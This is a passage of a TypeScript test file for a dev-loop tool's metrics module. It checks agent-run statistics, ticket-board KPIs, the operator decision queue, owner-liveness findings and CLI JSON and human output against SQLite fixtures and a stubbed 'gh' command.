// metrics.ts — fire metrics from fires.jsonl (window, success, suspect, medians), the 90d prune,
// board KPIs from issue.transition events (accept rate = Done ÷ (Done + In Review→Canceled)), and the CLI.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, realpathSync, rmSync, chmodSync, existsSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { fireMetrics, pruneFireLedger, boardMetrics, readFireRows, decisionQueue, ownerLiveness, renderHuman, usageReport, fireRowsFromEvents, renderUsage, renderCost, sensitiveMistier, kaizenReport, renderKaizen } from "../src/metrics.ts";
import { openDb } from "../src/db.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-metrics-")));
const DAY = 86_400_000;
const NOW = Date.parse("2026-07-04T12:00:00Z");
const iso = (ms: number) => new Date(ms).toISOString();

try {
  // ── fire metrics ──
  const ledger = join(tmp, "fires.jsonl");
  const row = (o: Record<string, unknown>) => JSON.stringify(o);
  writeFileSync(ledger, [
    row({ ts: iso(NOW - 1 * DAY), agent: "pm", project: "web", durationMs: 60_000, exitCode: 0 }),
    row({ ts: iso(NOW - 2 * DAY), agent: "pm", project: "web", durationMs: 120_000, exitCode: 0 }),
    row({ ts: iso(NOW - 3 * DAY), agent: "qa", project: "web", durationMs: 30_000, exitCode: 1 }),          // failure
    row({ ts: iso(NOW - 4 * DAY), agent: "qa", project: "web", durationMs: 40_000, exitCode: 0, suspectError: true, outputTail: "Execution error" }),
    row({ ts: iso(NOW - 5 * DAY), agent: "sweep", project: "", durationMs: 10_000, exitCode: 124, timedOut: true }),
    row({ ts: iso(NOW - 30 * DAY), agent: "pm", project: "web", durationMs: 5_000, exitCode: 0 }),          // outside 7d window
    "{torn json line",                                                                                       // crash mid-append → skipped
  ].join("\n") + "\n");

  const fm = fireMetrics(ledger, 7 * DAY, NOW);
  ok(fm.fires === 5, `7d window counts 5 fires (got ${fm.fires}; the 30d-old row + torn line excluded)`);
  ok(fm.failures === 2 && fm.timeouts === 1 && fm.suspectErrors === 1, "failures/timeouts/suspectErrors tallied");
  ok(fm.successRate !== null && Math.abs(fm.successRate - 2 / 5) < 1e-9, "success rate = (5-2-1)/5 = 40%");
  ok(fm.byAgent.pm.fires === 2 && fm.byAgent.pm.medianMs === 120_000, "per-agent median duration");
  ok(fm.byProject.web.fires === 4 && fm.byProject["(team)"].fires === 1, "per-project split; steward '' → (team)");

  // ── prune keeps only the retention window ──
  pruneFireLedger(ledger, 10 * DAY, NOW);
  ok(readFireRows(ledger).length === 5 && !readFileSync(ledger, "utf8").includes("torn"), "prune drops old + torn rows, keeps the window");

  // ── board KPIs from issue.transition events ──
  const db = openDb(join(tmp, "hub.db"));
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','web','Web','t')").run();
  const trans = (from: string, to: string, ms: number) =>
    db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','x','dev','issue.transition',?,?)")
      .run(JSON.stringify({ from, to }), iso(ms));
  trans("In Review", "Done", NOW - 1 * DAY);
  trans("In Review", "Done", NOW - 2 * DAY);
  trans("In Review", "Done", NOW - 3 * DAY);
  trans("In Review", "Canceled", NOW - 2 * DAY);   // verify-fail
  trans("Todo", "Canceled", NOW - 2 * DAY);         // ordinary cancel — NOT in the accept denominator
  trans("In Review", "Done", NOW - 20 * DAY);       // outside window
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-1','p','t','d','Bug','Todo',2,?, '[]','qa',?,?)")
    .run(JSON.stringify(["dev-loop", "Bug", "qa", "blocked"]), iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-2','p','t','d','Bug','Todo',2,?, '[]','ops',?,?)")
    .run(JSON.stringify(["dev-loop", "Bug", "qa", "incident"]), iso(NOW - DAY), iso(NOW - DAY));
  const bm = boardMetrics(db, "p", 7 * DAY, NOW);
  ok(bm.throughput === 3, `throughput = 3 Done in window (got ${bm.throughput})`);
  ok(bm.verifyFails === 1 && bm.acceptRate !== null && Math.abs(bm.acceptRate - 0.75) < 1e-9, "accept rate = 3/(3+1) = 75%; ordinary Cancel excluded");
  ok(bm.blockedNow === 1, "blocked-open count from the labels column");
  ok(bm.sequencedNow === 0, "LOOP-26: no live Blocked-by edges initially → sequencedNow = 0");
  ok(bm.qa.bugsFiled === 2 && bm.qa.escaped === 1 && bm.qa.escapeRatio === 0.5, "QA escape ratio = incident/signal Bugs ÷ all Bugs");

  // ── LOOP-26: blockedNow/sequencedNow split ─────────────────────────────────
  // T-SEQ: a ticket with `blocked` + live Blocked-by edge → sequenced (not parked)
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-DEP','p','blocker','d','Feature','Todo',2,'[]','[]','pm',?,?)")
    .run(iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-SEQ','p','sequenced','d','Feature','Todo',2,?,'[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "junior-dev", "blocked"]), iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES('c-seq','T-SEQ','pm',?,?)")
    .run("Blocked-by: T-DEP", iso(NOW - DAY));  // T-DEP is Todo (open) → live edge

  // T-DONE-DEP: a ticket with `blocked` + Blocked-by pointing to a Done ticket → parked (AC2)
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-DONE-DEP','p','done blocker','d','Feature','Done',2,'[]','[]','pm',?,?)")
    .run(iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-PAR2','p','parked2','d','Feature','Todo',2,?,'[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "blocked"]), iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO comments(id,ticket_id,author,body,created_at) VALUES('c-par2','T-PAR2','pm',?,?)")
    .run("Blocked-by: T-DONE-DEP", iso(NOW - DAY));  // T-DONE-DEP is Done → satisfied edge → parked

  const bm2 = boardMetrics(db, "p", 7 * DAY, NOW);
  // Now: T-1 (parked, no Blocked-by), T-PAR2 (parked, all Blocked-by done) → blockedNow=2
  //      T-SEQ (sequenced, live Blocked-by) → sequencedNow=1
  ok(bm2.blockedNow === 2, `LOOP-26: blockedNow counts only parked (attention-needed) tickets (got ${bm2.blockedNow})`);
  ok(bm2.sequencedNow === 1, `LOOP-26: sequencedNow counts tickets with live Blocked-by edges (got ${bm2.sequencedNow})`);
  ok(bm2.blockedNow + bm2.sequencedNow === 3, "LOOP-26: blockedNow + sequencedNow = total blocked-labelled open tickets");

  // AC6: a ticket with `blocked` but no Blocked-by comment at all → parked (fail-safe)
  // (T-1 covers this: it has `blocked` label, no comments at all)
  ok((() => { const bmChk = boardMetrics(db, "p", 7 * DAY, NOW); return bmChk.blockedNow >= 1; })(),
    "LOOP-26 AC6: blocked+no-Blocked-by-comment counts as parked (fail-safe toward needs-attention)");

  // ── P1-3: decisionQueue = Human-Blocked ∪ In Review@operator, oldest first ──
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-3','p','approve me','d','Feature','In Review','operator',0,'[]','[]','pm',?,?)")
    .run(iso(NOW - 4 * DAY), iso(NOW - 4 * DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-4','p','agent review','d','Feature','In Review','qa',0,'[]','[]','pm',?,?)")
    .run(iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-5','p','parked','d','Feature','Human-Blocked',NULL,0,'[]','[]','pm',?,?)")
    .run(iso(NOW - 2 * DAY), iso(NOW - 2 * DAY));
  const dq = decisionQueue(db, "p");
  ok(dq.length === 2 && dq[0].id === "T-3" && dq[1].id === "T-5", `decisionQueue = HB ∪ InReview@operator, oldest first (got ${dq.map((t) => t.id).join(",")})`);
  ok(!dq.some((t) => t.id === "T-4"), "an agent-assigned In Review ticket is not in the operator's queue");

  // ── LOOP-73: renderHuman decision queue age — AC1/AC2/AC3/AC4 ─────────────────────────────────────
  {
    // Minimal Workspace stub (renderHuman reads only ws.file.team.key).
    const fakeWs = { file: { team: { key: "test-key" }, repos: {}, projects: {} } } as any;
    const fakeFires = { windowMs: 7 * DAY, fires: 0, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null };
    const fakeRollup = { throughput: 0, verifyFails: 0, acceptRate: null, blockedNow: 0, sequencedNow: 0, bugsFiled: 0, escaped: 0 };

    // AC1: decision queue line shows age per item and names the oldest — oldest-first (T-3 at 4d, T-5 at 2d)
    const dqItems = [
      { id: "T-3", state: "In Review", project: "p", updatedAt: iso(NOW - 4 * DAY) },
      { id: "T-5", state: "Human-Blocked", project: "p", updatedAt: iso(NOW - 2 * DAY) },
    ];
    const lines73a: string[] = [];
    const origLog = console.log;
    console.log = (...args: unknown[]) => lines73a.push(String(args[0] ?? ""));
    try { renderHuman(fakeWs, 7 * DAY, fakeFires, { teamRollup: fakeRollup, decisionQueue: dqItems }, NOW); }
    finally { console.log = origLog; }
    const dqLine = lines73a.find((l) => l.startsWith("decision queue"));
    ok(dqLine !== undefined, "LOOP-73 AC1: decision queue line is present in renderHuman output");
    ok(/oldest T-3\[approve\] waiting 4d/.test(dqLine ?? ""),
      `LOOP-73 AC1: oldest item (T-3, 4 days) named with age in the header (got: ${dqLine})`);
    ok(/T-3\[approve\] 4d/.test(dqLine ?? "") && /T-5\[blocked\] 2d/.test(dqLine ?? ""),
      `LOOP-73 AC1: both items listed with their individual ages (got: ${dqLine})`);
    ok(/decision queue \(yours\): 2, oldest/.test(dqLine ?? ""),
      `LOOP-73 AC1: count prefix is correct (got: ${dqLine})`);

    // AC2: age is derived from updatedAt vs the threaded nowMs — no new query
    // (Verified by the test calling renderHuman with a fixed NOW; updatedAt already in the dq item.)

    // AC3: --json decisionQueue shape is byte-unchanged (id/title/state/updatedAt/project)
    const jsonItem = { id: "T-3", title: "approve me", state: "In Review", updatedAt: iso(NOW - 4 * DAY), project: "p" };
    ok(Object.keys(jsonItem).sort().join(",") === "id,project,state,title,updatedAt",
      "LOOP-73 AC3: --json decisionQueue item still has exactly id/title/state/updatedAt/project (shape unchanged)");

    // AC4: empty decision queue — no line emitted (the if (dq.length) guard stays)
    const lines73empty: string[] = [];
    const origLog2 = console.log;
    console.log = (...args: unknown[]) => lines73empty.push(String(args[0] ?? ""));
    try { renderHuman(fakeWs, 7 * DAY, fakeFires, { teamRollup: fakeRollup, decisionQueue: [] }, NOW); }
    finally { console.log = origLog2; }
    ok(!lines73empty.some((l) => l.startsWith("decision queue")),
      "LOOP-73 AC4: empty queue → no decision queue line (renders exactly as today)");
  }

  // ── LOOP-127: digest cost line in renderHuman ─────────────────────────────────────────────────────
  {
    const fakeWs = { file: { team: { key: "test-key" }, repos: {}, projects: {} } } as any;
    const fakeRollup = { throughput: 0, verifyFails: 0, acceptRate: null, blockedNow: 0, sequencedNow: 0, bugsFiled: 0, escaped: 0 };

    // AC2: no metered fires → "unmetered — 0 of N", never "$0.00", never omitted
    const noUsageFires = { windowMs: 7 * DAY, fires: 12, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null };
    const linesNoUsage: string[] = [];
    const origLogA = console.log;
    console.log = (...args: unknown[]) => linesNoUsage.push(String(args[0] ?? ""));
    try { renderHuman(fakeWs, 7 * DAY, noUsageFires, { teamRollup: fakeRollup, decisionQueue: [] }, NOW); }
    finally { console.log = origLogA; }
    const costLineNoUsage = linesNoUsage.find((l) => l.startsWith("cost:"));
    ok(costLineNoUsage !== undefined, "LOOP-127 AC2: cost line is present when no metered fires");
    ok(costLineNoUsage !== undefined && /unmetered — 0 of 12/.test(costLineNoUsage),
      `LOOP-127 AC2: no-usage renders 'unmetered — 0 of 12' (got: ${costLineNoUsage})`);
    ok(costLineNoUsage !== undefined && !/\$0/.test(costLineNoUsage),
      `LOOP-127 AC2: cost line never contains '$0' in no-data state (got: ${costLineNoUsage})`);

    // AC1: metered fires with cost → "$X.XXXX over N of M metered fires"
    const meteredFires = { windowMs: 7 * DAY, fires: 20, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 5, costMeteredFires: 3, costUsd: 0.12 };
    const linesMetered: string[] = [];
    const origLogB = console.log;
    console.log = (...args: unknown[]) => linesMetered.push(String(args[0] ?? ""));
    try { renderHuman(fakeWs, 7 * DAY, meteredFires, { teamRollup: fakeRollup, decisionQueue: [] }, NOW); }
    finally { console.log = origLogB; }
    const costLineMetered = linesMetered.find((l) => l.startsWith("cost:"));
    ok(costLineMetered !== undefined && /\$0\.1200 over 5 of 20 metered fires/.test(costLineMetered),
      `LOOP-127 AC1: metered cost renders dollar + coverage (got: ${costLineMetered})`);

    // AC1: $/accepted added when throughput > 0
    const rollupWithThroughput = { throughput: 4, verifyFails: 0, acceptRate: null, blockedNow: 0, sequencedNow: 0, bugsFiled: 0, escaped: 0 };
    const linesPerAccepted: string[] = [];
    const origLogC = console.log;
    console.log = (...args: unknown[]) => linesPerAccepted.push(String(args[0] ?? ""));
    try { renderHuman(fakeWs, 7 * DAY, meteredFires, { teamRollup: rollupWithThroughput, decisionQueue: [] }, NOW); }
    finally { console.log = origLogC; }
    const costLinePerAccepted = linesPerAccepted.find((l) => l.startsWith("cost:"));
    ok(costLinePerAccepted !== undefined && /accepted change/.test(costLinePerAccepted),
      `LOOP-127 AC1: $/accepted appended when throughput known (got: ${costLinePerAccepted})`);
  }

  // ── P1-4: ownerLiveness — a stranded owner (open tickets, no fires) is found; live/manual handled ──
  db.prepare("UPDATE tickets SET labels=? WHERE id='T-3'").run(JSON.stringify(["dev-loop", "qa"]));      // qa-owned, In Review
  db.prepare("UPDATE tickets SET labels=? WHERE id='T-4'").run(JSON.stringify(["dev-loop", "pm"]));      // pm-owned, In Review
  const olLedger = join(tmp, "ol-fires.jsonl");
  writeFileSync(olLedger, JSON.stringify({ ts: iso(NOW - DAY), agent: "pm", project: "web", durationMs: 1, exitCode: 0, timedOut: false }) + "\n");
  const ol = ownerLiveness(db, "p", olLedger, { nowMs: NOW });
  ok(ol.some((f) => f.owner === "qa" && f.openTickets >= 1 && f.lastFireTs === null && !f.manual),
    `ownerLiveness: qa owns open tickets with no fire on record → finding (got ${JSON.stringify(ol.map((f) => f.owner))})`);
  ok(!ol.some((f) => f.owner === "pm"), "ownerLiveness: pm fired within the window → no finding");
  const olManual = ownerLiveness(db, "p", olLedger, { nowMs: NOW, manualHandles: new Set(["qa"]) });
  ok(olManual.some((f) => f.owner === "qa" && f.manual), "ownerLiveness: agents.qa.manual:true flags the finding manual (awaiting a human)");
  const olStale = ownerLiveness(db, "p", olLedger, { nowMs: NOW + 10 * DAY });
  ok(olStale.some((f) => f.owner === "pm" && f.lastFireTs !== null), "ownerLiveness: a fire OLDER than the window counts as stranded too");
  // Mutation-killer (quality --mutate survivor, 1.7.1): the last-fire scan keys on
  // `!has(agent) || ts > max` — flipped to `&&`, a SECOND newer row never updates the max, so an
  // agent whose latest fire is inside the window (but whose FIRST row is stale) gets flagged.
  // Two rows, old-then-new, window covering only the new one: must stay un-flagged.
  const olTwo = join(tmp, "ol-two-fires.jsonl");
  writeFileSync(olTwo,
    JSON.stringify({ ts: iso(NOW - 9 * DAY), agent: "pm", project: "web", durationMs: 1, exitCode: 0, timedOut: false }) + "\n" +
    JSON.stringify({ ts: iso(NOW - DAY), agent: "pm", project: "web", durationMs: 1, exitCode: 0, timedOut: false }) + "\n");
  ok(!ownerLiveness(db, "p", olTwo, { nowMs: NOW }).some((f) => f.owner === "pm"),
    "ownerLiveness: the LATEST of several fires decides liveness (old row first must not stick)");

  // LOOP-30: assignee-only ticket (no tier label) must not create a silent-zero (AC1+AC2)
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-6','p','assignee-only','d','Feature','Todo','junior-dev',2,?,  '[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "pm"]), iso(NOW - DAY), iso(NOW - DAY));
  const olEmptyLedger = join(tmp, "ol-empty.jsonl");
  writeFileSync(olEmptyLedger, "");
  const olAssigneeOnly = ownerLiveness(db, "p", olEmptyLedger, { nowMs: NOW, handles: ["junior-dev"] });
  ok(olAssigneeOnly.some((f) => f.owner === "junior-dev"),
    "LOOP-30 AC1+AC2: Todo with assignee='junior-dev' but no tier label yields a finding — silent-zero path closed");
  // AC3: In Review's assignee is the implementer, NOT the verifier — label wins for In Review.
  // Capture count BEFORE inserting T-7 so the assertion is robust when other fixtures (e.g. LOOP-26
  // T-SEQ with label "junior-dev") are also in the DB on the merged branch.
  const jdCountBeforeT7 = olAssigneeOnly.find((f) => f.owner === "junior-dev")?.openTickets ?? 0;
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-7','p','in-review-shipped','d','Bug','In Review','junior-dev',2,?,  '[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "qa"]), iso(NOW - DAY), iso(NOW - DAY));
  const olInReview = ownerLiveness(db, "p", olEmptyLedger, { nowMs: NOW, handles: ["junior-dev", "qa"] });
  const jdFinding = olInReview.find((f) => f.owner === "junior-dev");
  ok(jdFinding !== undefined && jdFinding.openTickets === jdCountBeforeT7,
    `LOOP-30 AC3: In Review with assignee=junior-dev and label=qa is NOT counted toward junior-dev — openTickets stays ${jdCountBeforeT7} (same as before T-7 insert, not +1)`);
  ok(olInReview.some((f) => f.owner === "qa" && f.openTickets >= 1),
    "LOOP-30 AC3: In Review ticket with label=qa IS owned by qa (verifier ownership via label)");

  // ── LOOP-81: sensitiveMistier — backstop surfacing (design sensitive-routing Child C) ──
  // No senior-dev actor yet → function is a no-op regardless of ticket state.
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-SM1','p','sensitive-junior','d','Feature','Todo','junior-dev',2,?,  '[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "pm", "sensitive", "junior-dev"]), iso(NOW - DAY), iso(NOW - DAY));
  ok(sensitiveMistier(db, "p").length === 0,
    "sensitiveMistier: returns [] when no senior-dev actor exists (no-op in single-dev projects)");

  // Insert senior-dev actor → now the mis-tiered ticket is found.
  db.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES('a-sd','senior-dev','agent','Senior Dev',1,'t')").run();
  const smFindings = sensitiveMistier(db, "p");
  ok(smFindings.some((f) => f.id === "T-SM1" && f.assignee === "junior-dev" && f.labels.includes("sensitive")),
    "sensitiveMistier: finds non-terminal sensitive+junior-dev ticket when senior-dev exists");

  // A ticket with sensitive label but junior-dev only in assignee (no tier label) is also found.
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-SM2','p','sensitive-assignee-only','d','Feature','In Progress','junior-dev',2,?,  '[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "pm", "sensitive"]), iso(NOW - DAY), iso(NOW - DAY));
  const smFindings2 = sensitiveMistier(db, "p");
  ok(smFindings2.some((f) => f.id === "T-SM2"),
    "sensitiveMistier: finds sensitive+assignee='junior-dev' without the tier label");

  // Terminal tickets (Done, Canceled, Duplicate) must not appear.
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-SM3','p','sensitive-done','d','Feature','Done','junior-dev',2,?,  '[]','pm',?,?)")
    .run(JSON.stringify(["dev-loop", "pm", "sensitive", "junior-dev"]), iso(NOW - DAY), iso(NOW - DAY));
  ok(!sensitiveMistier(db, "p").some((f) => f.id === "T-SM3"),
    "sensitiveMistier: terminal (Done) sensitive+junior ticket is NOT surfaced");

  // A non-sensitive ticket is never returned.
  ok(!sensitiveMistier(db, "p").some((f) => f.id === "T-1"),
    "sensitiveMistier: non-sensitive tickets are never returned");

  db.close();

  // ── LOOP-12: FireRow with fireId parses; legacy row without fireId also parses ──
  const fireIdLedger = join(tmp, "fireid.jsonl");
  writeFileSync(fireIdLedger, [
    JSON.stringify({ ts: iso(NOW - DAY), agent: "pm", project: "web", durationMs: 100, exitCode: 0, fireId: "aaaa1111-bbbb-cccc-dddd-eeeeeeeeeeee" }),
    JSON.stringify({ ts: iso(NOW - 2 * DAY), agent: "qa", project: "web", durationMs: 200, exitCode: 0 }), // legacy: no fireId
  ].join("\n") + "\n");
  const fiRows = readFireRows(fireIdLedger);
  ok(fiRows.length === 2, `LOOP-12: both rows parse (got ${fiRows.length})`);
  ok(fiRows[0].fireId === "aaaa1111-bbbb-cccc-dddd-eeeeeeeeeeee",
    `LOOP-12: FireRow with fireId parses correctly (got ${fiRows[0].fireId})`);
  ok(fiRows[1].fireId === undefined, `LOOP-12: legacy FireRow without fireId parses without error (fireId=${fiRows[1].fireId})`);

  // ── CLI e2e on a real workspace (linear → fire metrics + boardNote) ──
  const HOME = join(tmp, "home");
  const ws = join(tmp, "ws");
  spawnSync("node", [join(hubRoot, "src", "team.ts"), "init", "--dir", ws, "--key", "met-team", "--backend", "linear", "--linear-team", "L"], { env: { ...process.env, DEVLOOP_HOME: HOME }, encoding: "utf8" });
  mkdirSync(join(ws, ".dev-loop", "team"), { recursive: true });
  writeFileSync(join(ws, ".dev-loop", "team", "fires.jsonl"), row({ ts: new Date().toISOString(), agent: "pm", project: "web", durationMs: 1000, exitCode: 0 }) + "\n");
  const r = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d", "--json"], { cwd: ws, env: { ...process.env, DEVLOOP_HOME: HOME }, encoding: "utf8" });
  const out = JSON.parse((r.stdout ?? "").trim());
  ok(r.status === 0 && out.team === "met-team" && out.fires.fires === 1, "CLI --json reports team + fire metrics from the workspace ledger");
  ok(typeof out.boardNote === "string" && /linear/.test(out.boardNote), "linear backend: boardNote says the digest agent owns board KPIs (no guessing)");
  // Mutation-killer (quality --mutate survivor, 1.7.1): `let asJson = false` flipped to true made
  // every run emit JSON and nothing asserted the HUMAN default. Without --json the output must be
  // the human render, not a parsable JSON object.
  const rh = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d"], { cwd: ws, env: { ...process.env, DEVLOOP_HOME: HOME }, encoding: "utf8" });
  const humanOut = (rh.stdout ?? "").trim();
  const parsesAsJson = (() => { try { JSON.parse(humanOut); return true; } catch { return false; } })();
  ok(rh.status === 0 && !parsesAsJson && /met-team/.test(humanOut), "CLI without --json renders the HUMAN report (not JSON)");

  // ── LOOP-26: AC3 + AC4 — service-backend CLI emits sequencedNow in JSON and human render ──
  const ws2 = join(tmp, "ws-svc");
  // The CLI's collectBoardMetrics checks existsSync(wsHubDb(ws)) = ws2/.dev-loop/hub.db,
  // so we must seed the DB at that exact path, not at an arbitrary svcHubDb path.
  const svcStateDir = join(ws2, ".dev-loop");
  const svcHubDb = join(svcStateDir, "hub.db");
  mkdirSync(svcStateDir, { recursive: true });
  writeFileSync(join(ws2, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2, workspaceId: "test-ws-svc",
    team: { key: "svc-team", backend: "service", mode: "live", autonomy: "guarded" },
    repos: {}, projects: { "svc-team": { repos: [] } },
  }));
  spawnSync("node", [join(hubRoot, "src", "seed.ts"), "svc-team", "Svc Team", "SVC", svcHubDb], { cwd: hubRoot, encoding: "utf8" });
  const rSvc = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d", "--json"], { cwd: ws2, env: { ...process.env }, encoding: "utf8" });
  const svcOut = (() => { try { return JSON.parse((rSvc.stdout ?? "").trim()); } catch { return {}; } })();
  ok(rSvc.status === 0, `LOOP-26 AC3: service metrics CLI exits 0 (stderr: ${(rSvc.stderr ?? "").replace(/\(node:.*?\)\n/g, "").slice(0, 200)})`);
  const svcBoard = svcOut.board?.["svc-team"] as Record<string, unknown> | undefined;
  ok(!!(svcBoard && typeof svcBoard.blockedNow === "number" && typeof svcBoard.sequencedNow === "number"),
    `LOOP-26 AC3: board JSON includes both blockedNow and sequencedNow (got ${JSON.stringify(svcBoard)})`);
  ok(!!(svcOut.teamRollup && typeof (svcOut.teamRollup as Record<string, unknown>).sequencedNow === "number"),
    "LOOP-26 AC3: teamRollup includes sequencedNow");
  const rSvcHuman = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d"], { cwd: ws2, env: { ...process.env }, encoding: "utf8" });
  const svcHumanOut = (rSvcHuman.stdout ?? "").trim();
  ok(/parked/.test(svcHumanOut) && /sequenced/.test(svcHumanOut),
    `LOOP-26 AC4: human render contains both 'parked' and 'sequenced' (got: ${svcHumanOut.slice(0, 300)})`);

  // Assert that svcOut (ws2, repos:{}) gives landed:null and landing:[] — AC3 baseline
  ok(svcOut.landed === null, `LOOP-42 AC3: no qualifying repos → landed: null not 0 (got ${JSON.stringify(svcOut.landed)})`);
  ok(Array.isArray(svcOut.landing), "LOOP-42 AC3: landing is always an array even with no qualifying repos");

  // ── LOOP-42: landed (number) + landing[] shape + human render "done"/"landed" with fake gh ──
  const ghBin = join(tmp, "fake-gh-bin");
  mkdirSync(ghBin, { recursive: true });
  const fakeGhPath = join(ghBin, "gh");
  writeFileSync(fakeGhPath, [
    "#!/usr/bin/env node",
    "const a = process.argv.slice(2).join(' ');",
    "const recent = new Date(Date.now() - 86400000).toISOString();",
    "if (/--state[= ]merged/.test(a)) process.stdout.write(JSON.stringify([{headRefName:'dev-loop/LOOP-1',mergedAt:recent}]));",
    "else if (/--state[= ]open/.test(a)) process.stdout.write(JSON.stringify([]));",
    "else if (/check-runs/.test(a)) process.stdout.write(JSON.stringify({check_runs:[]}));",
  ].join("\n"));
  chmodSync(fakeGhPath, 0o755);

  const wsLand = join(tmp, "ws-land");
  mkdirSync(join(wsLand, ".dev-loop"), { recursive: true });
  writeFileSync(join(wsLand, "dev-loop.json"), JSON.stringify({
    schemaVersion: 2, workspaceId: "test-ws-land",
    team: { key: "land-team", backend: "service", mode: "live", autonomy: "guarded" },
    repos: { myrepo: { path: "myrepo", remote: "https://github.com/test-org/my-repo.git", landing: "pr", autoMerge: true } },
    projects: { "land-team": { repos: [{ ref: "myrepo" }] } },
  }));
  spawnSync("node", [join(hubRoot, "src", "seed.ts"), "land-team", "Land Team", "LAND", join(wsLand, ".dev-loop", "hub.db")], { cwd: hubRoot, encoding: "utf8" });

  const pathWithFakeGh = `${ghBin}:${process.env.PATH ?? ""}`;
  const rLand = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d", "--json"], {
    cwd: wsLand, env: { ...process.env, PATH: pathWithFakeGh }, encoding: "utf8",
  });
  const landOut = (() => { try { return JSON.parse((rLand.stdout ?? "").trim()); } catch { return {}; } })() as Record<string, unknown>;
  ok(rLand.status === 0, `LOOP-42 AC1: metrics CLI with landing repo exits 0 (stderr: ${(rLand.stderr ?? "").replace(/\(node:.*?\)\n/g, "").slice(0, 200)})`);

  // AC1: landed is a number (sum of mergedInWindow for known repos)
  ok(typeof landOut.landed === "number", `LOOP-42 AC1: landed is a number (got ${JSON.stringify(landOut.landed)})`);
  ok(landOut.landed === 1, `LOOP-42 AC1: landed === 1 (one merged dev-loop PR in window, got ${landOut.landed})`);

  // AC1: landing[] has the expected shape
  ok(Array.isArray(landOut.landing), "LOOP-42 AC1: landing[] is an array");
  ok((landOut.landing as unknown[]).length === 1, `LOOP-42 AC1: landing[] has 1 entry (got ${(landOut.landing as unknown[]).length})`);
  const ls = (landOut.landing as Record<string, unknown>[])[0]!;
  ok(ls.repo === "myrepo", `LOOP-42 AC1: landing[0].repo = "myrepo" (got ${ls.repo})`);
  ok(ls.state === "healthy", `LOOP-42 AC1: landing[0].state = "healthy" (no open PRs → healthy, got ${ls.state})`);
  ok(ls.mergedInWindow === 1, `LOOP-42 AC1: landing[0].mergedInWindow === 1 (got ${ls.mergedInWindow})`);

  // AC2: throughput key byte-unchanged — landing addition must not rename or remove it
  ok(typeof (landOut.teamRollup as Record<string, unknown> | undefined)?.throughput === "number",
    "LOOP-42 AC2: teamRollup.throughput still present and a number after landing addition");

  // AC4: human render board line contains "done" and "landed"
  const rLandHuman = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d"], {
    cwd: wsLand, env: { ...process.env, PATH: pathWithFakeGh }, encoding: "utf8",
  });
  const landHumanOut = (rLandHuman.stdout ?? "").trim();
  ok(/\bdone\b/.test(landHumanOut), `LOOP-42 AC4: human board line contains "done" (got: ${landHumanOut.slice(0, 300)})`);
